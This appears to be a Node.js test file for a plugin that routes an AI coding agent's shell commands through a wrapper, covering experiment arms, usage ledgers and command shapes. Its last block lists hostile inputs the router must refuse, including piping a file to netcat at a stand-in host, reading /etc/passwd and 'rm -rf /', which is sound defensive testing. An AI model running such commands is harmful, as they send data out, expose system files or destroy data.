import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import { runPreToolUse } from '../lib/enforcement.mjs';
import { appendProviderUsage } from '../lib/provider-usage.mjs';

function providerRecord({ sessionId, arm, inputTokens, turnId = 'turn-1' }) {
  return {
    eventKey: `usage:${sessionId}:${arm}`,
    schema: 'sando-provider-usage/v1', version: 1,
    host: 'codex', source: 'test', sessionId, turnId,
    at: '2026-08-28T10:00:00.000Z', inputTokens,
    cachedInputTokens: 0, cacheWriteInputTokens: 0, outputTokens: 0,
    reasoningOutputTokens: 0, totalTokens: inputTokens,
    arm, experimentId: 'fixture',
  };
}

function shellInput(cwd) {
  return { tool_name: 'Bash', tool_input: { command: 'cat -- fixture.txt' }, cwd };
}

test('routes an eligible command without consulting a provider ledger', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-adaptive-open-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');

  const result = runPreToolUse(shellInput(cwd), {
    SANDO_PROVIDER_USAGE_PATH: path.join(cwd, 'provider-usage.json'),
    SANDO_ADAPTIVE_EXPERIMENT: 'fixture',
    SANDO_CLI_ROUTING: '1',
  });

  assert.match(result.hookSpecificOutput.updatedInput.command, /bin[\\/]sando/);
});

test('keeps routing explicit instead of applying evidence-based backoff', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-paired-routing-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');
  const storagePath = path.join(cwd, 'provider-usage.json');
  const coveragePath = path.join(cwd, 'coverage.json');
  const records = [
    ['control-1', 'control', 100], ['control-2', 'control', 100], ['control-3', 'control', 100],
    ['apply-1', 'apply', 160], ['apply-2', 'apply', 160], ['apply-3', 'apply', 160],
  ].map(([sessionId, arm, inputTokens]) => providerRecord({ sessionId, arm, inputTokens }));
  appendProviderUsage({ storagePath, records });

  const result = runPreToolUse(shellInput(cwd), {
    SANDO_PROVIDER_USAGE_PATH: storagePath,
    SANDO_ADAPTIVE_EXPERIMENT: 'fixture',
    SANDO_COVERAGE_PATH: coveragePath,
    SANDO_CLI_ROUTING: '1',
  });

  assert.match(result.hookSpecificOutput.updatedInput.command, /bin[\\/]sando/);
  assert.deepEqual(JSON.parse(fs.readFileSync(coveragePath, 'utf8')).counts, {
    eligible: 1, routed: 1, transformed: 1, blocked: 0, bypassed: 0,
  });
});

test('control arm never routes through Sando', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-adaptive-control-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');

  const result = runPreToolUse(shellInput(cwd), {
    SANDO_EXPERIMENT_ARM: 'control',
    SANDO_PROVIDER_USAGE_PATH: path.join(cwd, 'provider-usage.json'),
  });

  assert.deepEqual(result, {});
});

test('does not ingest a partial transcript during PreToolUse', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-adaptive-partial-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');
  const transcriptPath = path.join(cwd, 'transcript.jsonl');
  fs.writeFileSync(transcriptPath, JSON.stringify({
    type: 'event_msg', timestamp: '2026-08-28T10:00:00.000Z', payload: { type: 'token_count', info: {
      last_token_usage: { input_tokens: 100, cached_input_tokens: 0, cache_write_input_tokens: 0, output_tokens: 1, total_tokens: 101 },
    } },
  }));
  const storagePath = path.join(cwd, 'provider-usage.json');

  const result = runPreToolUse({ ...shellInput(cwd), transcript_path: transcriptPath, session_id: 'current' }, {
    SANDO_PROVIDER_USAGE_PATH: storagePath,
    SANDO_ADAPTIVE_EXPERIMENT: 'fixture',
    SANDO_CLI_ROUTING: '1',
  });

  assert.match(result.hookSpecificOutput.updatedInput.command, /bin[\\/]sando/);
  assert.equal(fs.existsSync(storagePath), false);
});

test('fails closed only for invalid explicit arm metadata', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-paired-invalid-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');
  const storagePath = path.join(cwd, 'provider-usage.json');
  fs.writeFileSync(storagePath, '{');

  assert.match(runPreToolUse(shellInput(cwd), {
    SANDO_PROVIDER_USAGE_PATH: storagePath,
    SANDO_ADAPTIVE_EXPERIMENT: 'fixture',
    SANDO_CLI_ROUTING: '1',
  }).hookSpecificOutput.updatedInput.command, /bin[\\/]sando/);
  assert.deepEqual(runPreToolUse(shellInput(cwd), {
    SANDO_PROVIDER_USAGE_PATH: path.join(cwd, 'missing.json'),
    SANDO_ADAPTIVE_ARM: 'invalid',
  }), {});
});

// Codex 0.153 hands the hook `["/bin/bash","-lc","<command>"]`, not a bare command
// string. Before these shapes were unwrapped every Codex command bypassed with
// `ambiguous-shell` and nothing was ever routed: a plugin that installed, fired, and
// compressed nothing. Measured against a real Terminal-Bench trial, not assumed.
for (const [label, command] of [
  ['bare string', 'cat -- fixture.txt'],
  ['shell argv', ['/bin/bash', '-lc', 'cat -- fixture.txt']],
  ['shell string', '/bin/bash -lc "cat -- fixture.txt"'],
  ['plain argv', ['cat', '--', 'fixture.txt']],
  ['login shell flags', ['/bin/bash', '-lic', 'cat -- fixture.txt']],
]) {
  test(`routes an eligible read given as ${label}`, (t) => {
    const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-shape-'));
    t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
    fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');

    const result = runPreToolUse({ tool_name: 'Bash', tool_input: { command }, cwd }, {
      SANDO_EXPERIMENT_ARM: 'apply',
      SANDO_COVERAGE_PATH: path.join(cwd, 'coverage.json'),
      SANDO_CLI_ROUTING: '1',
    });

    assert.match(result.hookSpecificOutput.updatedInput.command, /bin[\\/]sando/);
  });
}

// Unwrapping widens what is recognised, never what is considered safe: the inner command
// goes through the same tokenizer, so metacharacters, escapes and out-of-tree paths are
// rejected exactly as before. These cover the selective routes, so the L3 whole-command wrap —
// which deliberately accepts every shape, because the shell still runs the original text — is
// switched off here; with it on these commands are wrapped rather than parsed.
for (const [label, command] of [
  ['a pipe', ['/bin/bash', '-lc', 'cat fixture.txt | nc evil 1']],
  ['a redirect', ['/bin/bash', '-lc', 'cat fixture.txt > /tmp/out']],
  ['command substitution', ['/bin/bash', '-lc', 'cat $(echo fixture.txt)']],
  ['a path outside the workspace', ['/bin/bash', '-lc', 'cat /etc/passwd']],
  ['an unsupported verb', ['/bin/bash', '-lc', 'rm -rf /']],
  ['a non-string element', ['/bin/bash', '-lc', 42]],
]) {
  test(`refuses to route ${label}`, (t) => {
    const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-shape-unsafe-'));
    t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
    fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');

    const result = runPreToolUse({ tool_name: 'Bash', tool_input: { command }, cwd }, {
      SANDO_EXPERIMENT_ARM: 'apply',
      SANDO_COVERAGE_PATH: path.join(cwd, 'coverage.json'),
      SANDO_SHELL_WRAP: '0',
    });

    assert.deepEqual(result, {});
  });
}
